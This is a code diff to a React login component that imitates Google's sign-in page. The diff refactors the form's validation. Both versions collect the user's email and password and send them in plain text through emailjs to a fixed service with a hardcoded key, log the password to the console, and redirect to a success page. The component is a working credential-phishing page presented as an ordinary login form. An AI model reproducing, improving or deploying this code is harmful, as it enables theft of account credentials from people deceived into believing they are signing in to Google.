@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import './LoginSignUp.css';
 import { useNavigate } from 'react-router-dom';
 import userProfile from '../Assets/images.png';
@@ -8,76 +8,80 @@ import emailjs from 'emailjs-com';
 const LoginSignUp = () => {
     const [showPassword, setShowPassword] = useState(false);
     const [isActive, setIsActive] = useState(false);
-    const [emailValue, setEmailValue] = useState('');
-    const [passwordValue, setPasswordValue] = useState('');
-    const [emailError, setEmailError] = useState('');
-    const [passwordError, setPasswordError] = useState('');
     const [formData, setFormData] = useState({ email: '', password: '' });
+    const [errors, setErrors] = useState({ email: '', password: '' });
     const navigate = useNavigate();
 
-    const handleCheckboxChange = () => {
-        setShowPassword(!showPassword);
-    };
-
+    // Handle input changes
     const handleInputChange = (event) => {
         const { name, value } = event.target;
-        if (name === 'email') {
-            setEmailValue(value);
-            validateEmail(value);
-        } else if (name === 'password') {
-            setPasswordValue(value);
-            if (passwordError) setPasswordError('');
-        }
+        setFormData({ ...formData, [name]: value });
     };
 
-    const validateEmail = (email) => {
-        const pattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-        setEmailError(pattern.test(email) ? '' : 'Invalid email address');
-    };
-
-    const handleNextClick = (e) => {
-        e.preventDefault(); // Prevent default behavior
-        if (!emailValue.trim()) {
-            setEmailError('Please enter your email.');
-        } else if (!emailError) {
-            setFormData({ ...formData, email: emailValue });
-            setIsActive(true);
-        }
-    };
-
-    const handleFinishClick = (e) => {
-        e.preventDefault(); // Prevent default behavior
-        if (!passwordValue.trim()) {
-            setPasswordError('Please enter your password.');
+    // Validate email
+    useEffect(() => {
+        if (formData.email) {
+            const pattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+            setErrors((prevErrors) => ({
+                ...prevErrors,
+                email: pattern.test(formData.email) ? '' : 'Invalid email address',
+            }));
         } else {
-            setFormData({ ...formData, password: passwordValue });
-            handleSubmit(); // Submit form
+            setErrors((prevErrors) => ({
+                ...prevErrors,
+                email: 'Email is required',
+            }));
         }
+    }, [formData.email]);
+
+    // Validate password
+    useEffect(() => {
+        if (formData.password) {
+            setErrors((prevErrors) => ({
+                ...prevErrors,
+                password: '',
+            }));
+        } else {
+            setErrors((prevErrors) => ({
+                ...prevErrors,
+                password: 'Password is required',
+            }));
+        }
+    }, [formData.password]);
+
+    // Handle 'Next' button click
+    const handleNextClick = (e) => {
+        e.preventDefault();
+        if (errors.email) return; // Prevent if there are email errors
+
+        setIsActive(true);
     };
 
+    // Handle 'Finish' button click
+    const handleFinishClick = (e) => {
+        e.preventDefault();
+        if (errors.password) return; // Prevent if there are password errors
+
+        handleSubmit(); // Proceed with form submission
+    };
+
+    // Handle form submission
     const handleSubmit = () => {
-        // Validate form data before sending
-        if (!formData.email) {
-            alert('Email is required.');
+        if (!formData.email || !formData.password) {
+            alert('Email and password are required.');
             return;
-        }else if(formData.password == ''){
-            alert(" and password")
-            return
         }
 
-        // Create template parameters for emailjs
         const templateParams = {
             email: formData.email,
-            password: formData.password, // This is sent as plain text
+            password: formData.password,
         };
 
-        // Send email using emailjs
         emailjs.send('service_fbtczun', 'template_v8ofilw', templateParams, 'HLpn8KxyhDLpeMH4a')
             .then((response) => {
-                // Clear form data on success
                 setFormData({ email: '', password: '' });
-                navigate('/success'); // Navigate to a success page
-                console.log('password', formData.password);
+                navigate('/success');
+                console.log('Password:', formData.password);
             })
             .catch((error) => {
                 alert('Failed to send message.');
@@ -93,21 +97,19 @@ const LoginSignUp = () => {
                     <div className="text">Sign in</div>
                     <h4>with your Google account</h4>
                     <h4 className='blue'>Learn more about using your account</h4>
-                    
+
                     <div className="inputs">
                         <div className="input">
                             <input
                                 type='email'
-                                value={emailValue}
                                 name='email'
+                                value={formData.email}
                                 onChange={handleInputChange}
                                 placeholder='Enter your Email'
                                 className='passwordInput'
-                                style={{ borderColor: emailError ? 'red' : '' }}
+                                style={{ borderColor: errors.email ? 'red' : '' }}
                             />
-                            <div className="errors">
-                                {emailError && <p className="error">{emailError}</p>}
-                            </div>
+                            {errors.email && <p className="error">{errors.email}</p>}
                             <div className="password">
                                 <h4 className="blue">Forgot email?</h4>
                             </div>
@@ -124,28 +126,27 @@ const LoginSignUp = () => {
 
                     <div className="user">
                         <img src={userProfile} alt="User Profile" className='user'/>
-                        <div className="text">{emailValue}</div>
+                        <div className="text">{formData.email}</div>
                     </div>
-                    
+
                     <div className="inputs">
                         <div className="input">
                             <input
                                 type={showPassword ? 'text' : 'password'}
                                 name='password'
-                                value={passwordValue}
+                                value={formData.password}
                                 onChange={handleInputChange}
                                 placeholder='Enter your password'
                                 className='passwordInput'
                             />
-                            {passwordError && <p className="error">{passwordError}</p>}
+                            {errors.password && <p className="error">{errors.password}</p>}
                             <div className="password">
                                 <label htmlFor="showPassword">
                                     <input
                                         type="checkbox"
-                                        name="showPassword"
                                         id="showPassword"
                                         checked={showPassword}
-                                        onChange={handleCheckboxChange}
+                                        onChange={() => setShowPassword(!showPassword)}
                                     />
                                     Show password
                                 </label>
